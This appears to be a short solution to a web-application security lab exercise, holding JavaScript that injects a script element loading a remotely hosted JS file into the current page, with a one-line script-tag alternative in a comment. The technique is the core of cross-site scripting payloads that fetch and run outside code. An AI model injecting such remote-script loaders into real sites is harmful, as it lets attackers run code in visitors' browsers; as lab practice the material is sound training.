// https://pentesteracademylab.appspot.com/lab/webapp/jfp/10

// Objectives:
//     Include the JS file available at http://demofilespa.s3.amazonaws.com/jfptest.js into this page

var js = document.createElement('script');
js.src = 'http://demofilespa.s3.amazonaws.com/jfptest.js';
js.type = "text/javascript";
document.body.appendChild(js);


// OR just simply add use this
// <script src='http://demofilespa.s3.amazonaws.com/jfptest.js'></script>